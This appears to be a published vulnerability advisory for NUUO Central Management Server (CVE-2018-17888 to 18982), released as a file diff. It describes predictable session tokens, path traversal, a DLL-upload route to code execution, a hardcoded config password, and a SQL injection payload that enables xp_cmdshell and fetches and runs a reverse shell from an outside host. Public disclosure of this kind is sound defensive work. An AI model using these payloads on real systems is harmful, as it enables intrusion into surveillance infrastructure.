@@ -1,0 +1,317 @@
+>> Multiple vulnerabilities in NUUO Central Management Server
+>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security (http://www.agileinfosec.co.uk/)
+==========================================================================
+Disclosure: 11/10/2018 / Last updated: 21/01/2019
+
+
+>> Background on the affected products:
+NUUO is a vendor of Network Video Recording (NVR) systems for surveillance cameras. These NVR are Linux embedded video recording systems that can manage a number of cameras and are used worldwide by public institutions, banks, SME's, etc. 
+
+From their webpage:
+"The Central Management System (NCS) is a powerful system which brings traditional central management systems out of the control room through Internet access. The network-based key operation system can manage unlimited combinations of analog and network cameras worldwide, via unlimited working stations in different locations. NCS is the universal solution for large scale projects.
+The NCS System uses client/server architecture to manage unlimited recording systems. These send events to the NCS Alarm Server. After filtering the events, the NCS Alarm server sends alarm logs of pre-determined events to a SQL Server (SQL database) and NCS Client systems. The NCS Client system allows users in different locations to log in to the NCS Alarm server and, if they have the authority, to change the system configuration. The NCS Matrix system can be viewed as an extension of the NCS client used to populate the alarms to additional monitors. NCS Matrix system is controlled by NCS Client users."
+
+A more detailed explanation can be found in [1]. Nuuo Central Management System / NCS will be referred to as CMS for the remainder of this document.
+
+The disclosure of these vulnerabilities were handled by ICS-CERT, which have generously donated their time to ensure (some) vulnerabilities were fixed by Nuuo. Their advisory can be seen at [2].
+It Nuuo TWO YEARS to fix 6 out of 7 of the vulnerabilities presented here, and one of them (authenticated arbitrary file download) is still unfixed as of the date of the latest update to this advisory.
+
+The vulnerablities were reported to ICS-CERT on 4/11/2016, and ICS-CERT reported them to Nuuo shortly after. There were many emails back and forth between ICS-CERT, myself and Nuuo, until finally ICS-CERT disclosed the vulnerability on 11/10/2018, 23 days shy of two years.
+I will not write a detailed timeline nor disclose any communications, as it is clear that Nuuo handled this in a very incompetent way. The only reason I did not disclose it earlier was because of the help and patience of ICS-CERT.
+
+Four Metasploit modules have been released with this advisory ([3]). These will be submitted to Metasploit in the coming days and should be integrated into the framework soon.
+A copy of this advisory can be found at [4].
+
+
+>> Summary:
+NUUO CMS uses a ASCII based network protocol ("NUCM") which is similar to HTTP. This protocol is used for communication between the CMS client and the server. The default port for this protocol is TCP 5180.
+
+As an example, for the CMS client to login to CMS server the following request is sent:
+USERLOGIN NUCM/1.0
+Version: <CLIENT_VERSION>
+Username: <USERNAME>
+Password-Length: <PW_LEN>
+TimeZone-Length: <TZ_LEN>
+
+<PASSWORD><TIMEZONE>
+
+To which the server responds:
+NUCM/1.0 200 OK
+User-Valid: 1
+Server-Version: <SERVER_VERSION>
+Ini-Version: 1
+License-Number: <LICENSE>
+User-Session-No: <USER_SESSION>
+
+The client can then issue a series of commands, such as order cameras to move, make a backup of the alarms in the server, create a user, etc.
+
+The full list of HTTP-like verbs that the NUCM protocol accepts can be found in Appendix #A.
+
+While this protocol provides a mechanism for authentication, the assignment of user session numbers is flawed, and can easily be guessed by an attacker in under 500,000 attempts (probably less if analysed thoroughly). 
+
+In addition to this, some verbs of the protocol have directory traversal flaws, which can be exploited by an authenticated attacker to download and upload files, and can also be abused to achieve remote code execution, while other verbs such as the GETOPENALARM verb contain a SQL injection vulnerability. Finally, the CMS Server installs an outdated and vulnerable version of SQL Server by default (SQL Server 2005 Express), and both the CMS client and server disable the Windows User Access Control after installation, which is not a great idea.
+
+<TODO PLEASE IGNORE> Metasploit exploits and auxiliary modules for #1, #4, #5 and #6 have been released.>
+
+
+>> Technical details:
+#1
+Vulnerability: Predictable session tokens
+CVE-2018-17888
+Attack Vector: Remote
+Constraints: None
+Affected products / versions:
+- NUUO Central Management Server (CMS): all versions below 2.4.0
+
+The NUUO CMS protocol uses session tokens in a similar way to HTTP cookies. As mentioned in the summary, if a USERLOGIN request is sent with a correct username and password, a "User-Session-No" token will be returned. The number returned is composed of 8 digits, so if an attacker wanted to guess it, they would have 10 million possibilities, and would be able to bruteforce it on average after 5 million tries.
+
+The function responsible for creating a new user is at offset 0x454E80 in CMS_Server.exe version 2.1. It sets up a new user object and returns the session token to the calling function. This function has what is probably a coding error - the number returned is actually not a number, but the heap address of the user object created by invoking "new()" in the user object class. An assembly snippet is shown below:
+.text:00454E80 000                 push    0FFFFFFFFh
+.text:00454E82 004                 push    offset loc_5E2013
+.text:00454E87 008                 mov     eax, large fs:0
+.text:00454E8D 008                 push    eax
+.text:00454E8E 00C                 sub     esp, 8    
+.text:00454E91 014                 push    ebp
+.text:00454E92 018                 push    esi
+.text:00454E93 01C                 push    edi
+.text:00454E94 020                 mov     eax, dword_68D134
+.text:00454E99 020                 xor     eax, esp   
+.text:00454E9B 020                 push    eax
+.text:00454E9C 024                 lea     eax, [esp+24h+var_C]
+.text:00454EA0 024                 mov     large fs:0, eax
+.text:00454EA6 024                 mov     ebp, ecx
+.text:00454EA8 024                 lea     edi, [ebp+43Ch] 
+.text:00454EAE 024                 push    edi             ; lpCriticalSection_EnterCriticalSection
+.text:00454EAF 028                 mov     [esp+28h+var_10], edi
+.text:00454EB3 028                 call    ds:EnterCriticalSection
+.text:00454EB9 024                 push    1B8h            ; unsigned int
+.text:00454EBE 028                 mov     [esp+28h+var_4], 0
+.text:00454EC6 028                 call    ??2@YAPAXI@Z    ; new() operator, returns object in eax
+(...)
+
+After the call to ??2@YAPAXI@Z in .text:00454EC6, the session number is returned to the calling function (sub_457100), which then stores it and sends it back to the client as the valid session number:
+NUCM/1.0 200 OK
+User-Valid: %d
+Server-Version: %s
+Ini-Version: %d
+License-Number: %d
+User-Session-No: %u <---- session number, which is a hexadecimal memory address converted to decimal
+
+These session numbers (tokens) are not that easy to predict, however after collecting thousands of samples I was able to build a table of the most common occurrences, which reduces the possibilities from 10 million to about 1.2 million. In practice, the tokens can usually be guessed between in less than 500,000 attempts - an improvement of 95% over standard bruteforcing. It is likely this can be further improved with some deeper analysis, but due to time constraints this was not investigated further. The tables used to do the bruteforcing are in Appendix #C.
+
+This attack is perfectly feasible despite the high number of attempts needed. Firstly, there is no bruteforce protection on the CMS server, so we can just flood it with requests and find the session number in less than an hour. 
+Secondly, due to the nature of this application, it is normal to have the software clients logged in for a long amount of time (days, weeks) in order to monitor the video cameras controlled by CMS.
+
+It is worth noticing that when a user logs in, the session has to be maintained by periodically sending a PING request. To bruteforce the session, we send each guess with a PING request until a 200 OK message is received. 
+
+
+#2
+Vulnerability: Outdated and insecure software component (SQL Server 2005 Express)
+CVE-2018-17890
+Attack Vector: N/A
+Constraints: N/A
+Affected products / versions:
+- NUUO Central Management Server (CMS): all versions below 2.10.0
+
+NUUO CMS installs by default SQL Server 2005 Express in the host that will have the CMS database. This is an outdated and insecure version of SQL Server Express, which has plenty of security advisories and exploits that can be used against it. This is leveraged in vulnerability #6 to achieve remote code execution via SQL injection. 
+Version 2.10.0 updates it to SQL Server 2014, which is still outdated. Nuuo considers this vulnerability "fixed".
+
+
+#3
+Vulnerability: Insecure default configuration (Windows User Access Control is disabled by CMS)
+CVE-2018-17892
+Attack Vector: N/A
+Constraints: N/A
+Affected products / versions:
+- NUUO Central Management Server (CMS): all versions below 2.5
+- NUUO Central Management client: at least version 2.3.2, others unknown
+
+At the end of the NUUO CMS Server installation, the installer informs the user that the Windows User Access Control (UAC) will be disabled. After the installation is finished, UAC will remain disabled in the CMS host. This leaves the host in an insecure state, as the user will not be notified of any actions being performed that are deemed sensitive by Windows. Some CMS Client versions also disable UAC after installation (at least version 2.3.2, other versions vary in behaviour).
+
+
+#4
+Vulnerability: Directory traversal on "GETCONFIG" file download function (arbitrary file download)
+CVE-2018-17934
+Attack Vector: Remote
+Constraints: Authentication required (either by having an account or hijacking the session token as described in #1)
+Affected products / versions:
+- NUUO Central Management Server (CMS): all versions up to and including 3.5.0
+
+The GETCONFIG verb is used by a CMS client to obtain configuration files and other resources from the CMS server. An example request is below:
+
+GETCONFIG NUCM/1.0
+FileName: <filename>
+FileType: <number>
+User-Session-No: <session-number>
+
+The FileType determines the directory where the file will be downloaded from. "FileType: 0" will download from the base installation directory (CMS_DIR), while "FileType: 1" will download from "<CMS_DIR>\Images\Map\". There are other defined FileType integers, but these have not been investigated in detail.
+
+The vulnerability is in the "FileName" parameter, which accepts directory traversal (..\\..\\) characters. Therefore, this function can be abused to obtain any files off the file system, including:
+- CMServer.cfg, a file zipped with the password "NUCMS2007!" that contains the usernames and passwords of all the system users (enabling a less privileged user to obtain the administrator's password)
+- ServerConfig.cfg, another file zipped with the password "NUCMS2007!" that contains the SQL Server "sa" password as well the FTP server username and password
+- Any other sensitive files in the drive where CMS Server is installed.
+
+
+#5
+Vulnerability: Directory traversal on "COMMITCONFIG" file upload function (arbitrary file upload, exploitable for remote code execution)
+CVE-2018-17936
+Attack Vector: Remote
+Constraints: Authentication required (either by having an account or hijacking the session token as described in #1)
+Affected products / versions:
+- NUUO Central Management Server (CMS): all versions below 2.5
+
+The COMMITCONFIG verb is used by a CMS client to upload and modify the configuration of the CMS Server. An example is below:
+
+COMMITCONFIG NUCM/1.0
+User-Session-No: <session-number>
+Filename: <filename>
+FileType: <number>
+Content-Lenght: <file-length>
+<FILE_DATA>
+
+The vulnerability is in the "FileName" parameter, which accepts directory traversal (..\\..\\) characters. Therefore, this function can be abused to overwrite any files in the installation drive of CMS Server.
+
+It is possible to achieve remote code execution by doing the following:
+1) Create a payload DLL using msfvenom, backdoor-factory or similar tools
+2) Upload the payload LicenseTool.dll using COMMITCONFIG, and replace the existing file
+3) Force the server to load LicenseTool.dll by sending the GETLICINFO or SENDLICFILE NUCM command
+4) CMS will then execute the payload upon loading LicenseTool.dll
+
+This vulnerability also makes it possible to change the administrator password (by a non-administrator user), replacing various configuration files, write arbitrary files to the drive where CMS is installed, etc.
+
+
+#6
+Vulnerability: SQL injection in GETOPENALARM (exploitable for remote code execution)
+CVE-2018-18982
+Attack Vector: Remote
+Constraints: Authentication required (either by having an account or hijacking the session token as described in #1)
+Affected products / versions:
+- NUUO Central Management Server (CMS): all versions below 3.1
+
+The GETOPENALARM verb is used to obtain information about alarms stored in the CMS Server database. An example request is below:
+
+GETOPENALARM NUCM/1.0
+DeviceID: <number>
+SourceServer: <server-id>
+LastOne: <number>
+
+The vulnerability is in the "SourceServer" parameter, which allows injection of arbitrary SQL characters, and can be abused to inject SQL into the executing statement. For example the following request:
+
+GETOPENALARM NUCM/1.0
+DeviceID: 1
+SourceServer: ';drop table bobby;-- 
+LastOne: 3
+
+Will cause the following SQL query to be executed on the server:
+SELECT AlarmNo, EventType, DeviceID, Channel, EventDesc, DateTime, PreviewImage, SourceServer, AlarmID, State, Priority, Owner, HistoryNo, PosTransaction, AlarmNote, AlarmType FROM AlarmLog WHERE DeviceID=1 AND SourceServer='';drop table bobby;-- ' AND State<20 order by DateTime DESC
+
+Given that SQL Server 2005 Express is used by default (see vulnerability #2), this can be abused to enable xp_cmdshell and achieve remote code execution.
+
+As as example, here is a full working exploit that downloads a reverse shell from http://10.0.99.102/shell.exe and executes it:
+';exec sp_configure 'show advanced options', 1; reconfigure; exec sp_configure 'xp_cmdshell', 1; reconfigure; declare @q varchar(8000); select @q=0x78705f636d647368656c6c2027636420433a5c77696e646f77735c74656d705c202626206563686f202473746f726167654469723d24707764203e20776765742e707331202626206563686f2024776562636c69656e74203d204e65772d4f626a6563742053797374656d2e4e65742e576562436c69656e74203e3e20776765742e707331202626206563686f202475726c203d2022687474703a2f2f31302e302e39392e3130322f7368656c6c2e65786522203e3e20776765742e707331202626206563686f202466696c65203d20227368656c6c2e65786522203e3e20776765742e707331202626206563686f2024776562636c69656e742e446f776e6c6f616446696c65282475726c2c2466696c6529203e3e20776765742e70733120262620706f7765727368656c6c2e657865202d457865637574696f6e506f6c69637920427970617373202d4e6f4c6f676f202d4e6f6e496e746572616374697665202d4e6f50726f66696c65202d46696c6520776765742e70733120262620636d64202f6320433a5c77696e646f77735c74656d705c7368656c6c2e65786527; exec (@q);-- 
+
+The encoded part of the exploit is the following:
+xp_cmdshell 'cd C:\windows\temp\ && echo $storageDir=$pwd > wget.ps1 && echo $webclient = New-Object System.Net.WebClient >> wget.ps1 && echo $url = "http://10.0.99.102/shell.exe" >> wget.ps1 && echo $file = "shell.exe" >> wget.ps1 && echo $webclient.DownloadFile($url,$file) >> wget.ps1 && powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 && cmd /c C:\windows\temp\shell.exe'
+
+
+#7
+Vulnerability: Insecure default administrator password
+CVE-2018-17894
+Attack Vector: Remote
+Constraints: None
+Affected products / versions:
+- NUUO Central Management Server (CMS): all versions below 3.1
+
+The "admin" user has an empty ("") default password and does not force the user to change it upon first login. 
+An attacker that abuses this information can obtain configuration files, write files to disk, and perform other sensitive or dangerous actions, including others mentioned in this vulnerability report, such as injecting a malicious DLL to achieve code execution.
+
+
+>> Fix: 
+For #1, upgrade to Nuuo Central Management Server (CMS) version 2.4 or above.
+For #2, upgrade to CMS version 2.10 or above.
+For #3 and #5, upgrade to CMS version 2.5 or above.
+For #6 and #7, upgrade to CMS version 3.1 or above.
+
+Vulnerability #4 remains unfixed on the latest version at the time of writing, CMS version 3.5.
+
+Please note that Agile Information Security does not verify any fixes, except when noted in the advisory or requested by the vendor. The vendor fixes might be ineffective or incomplete, and it is the vendor's responsibility to ensure the vulnerablities found by Agile Information Security are resolved properly.
+
+
+>> References:
+[1] http://www.nuuo.com/ProductNode.php?node=3
+[2] https://ics-cert.us-cert.gov/advisories/ICSA-18-284-02
+[3] https://github.com/pedrib/PoC/tree/master/exploits/metasploit/nuuo_cms
+
+>> Appendix:
+
+#A
+Full list of HTTP-like verbs in NUCM (collected in CMS version 2.1.0):
+
+GetALARMNOTETEMPLATE
+UPDATEALARMNOTETEMPLATE
+SENDEMAIL
+ALARMPROPERTY
+PING
+ASKPTZPRIORIT
+GETADDOMAINUSER
+GETADLOCALUSER
+GETADPATH
+NCSADDSYSTEMLOG
+NCSSYSTEMLOG
+BACKUPCANCEL
+BACKUP
+SENDLICFILE
+GETLICSTATUS
+GETLICINFO
+GETSERVERSTATUS
+GETPOSDATA
+SENDSMSMESSAGE
+GETCOMPORTS
+GETPREVIEWIMG
+QUERYALARM
+GETOPENALARM
+UPDATEALARMHISTORY
+QUERYALARMHISTORYCRI
+QUERYALARMHISTORY
+CLIENTREADY
+COMMITCONFIG
+GETCONFIG
+USERLOGOUT
+USERLOGIN
+
+
+#B
+A few of the NUCM error codes:
+603 - Forbidden (invalid session)
+612 - Incorrect protocol version
+
+
+#C Table used to generate to generate the session tokens
+
+# These tables were generated by doing thousands of requests to a NUUO CMS Server and collecting the responses. 
+# Table id: hex-nu-mod
+
+# 1048576 total combinations
+WEIGHTED_ARRAY_7 = 
+  ["2"],
+  ["4", "6", "5", "7", "8", "2", "0", "1"],
+  ["1", "6", "0", "8", "d", "7", "c", "e", "2", "b", "f", "3", "5", "4", "a", "9"],
+  ["d", "6", "4", "5", "f", "0", "8", "7", "a", "3", "1", "b", "c", "e", "9", "2"],
+  ["3", "e", "f", "1", "c", "5", "9", "d", "8", "6", "0", "4", "a", "2", "b", "7"],
+  ["d", "4", "2", "b", "3", "6", "8", "1", "a", "7", "f", "e", "0", "9", "5", "c"],
+  ["8", "0"]
+
+# 189000 total combinations
+WEIGHTED_ARRAY_6 = 
+  ["9", "a"],
+  ["7", "c", "6", "f", "e", "a", "d", "9", "4", "5", "3", "2", "b", "0", "8"],
+  ["7", "b", "6", "d", "a", "3", "4", "f", "5", "1", "8", "e", "c", "2"],
+  ["3", "1", "c", "f", "d", "4", "b", "a", "6", "2", "5", "e", "8", "9", "0"],
+  ["3", "6", "7", "b", "e", "9", "2", "f", "4", "1", "c", "a", "0", "d", "8"],
+  ["0", "8"]
+
+
+================
+Agile Information Security Limited
+http://www.agileinfosec.co.uk/
+>> Enabling secure digital business >>
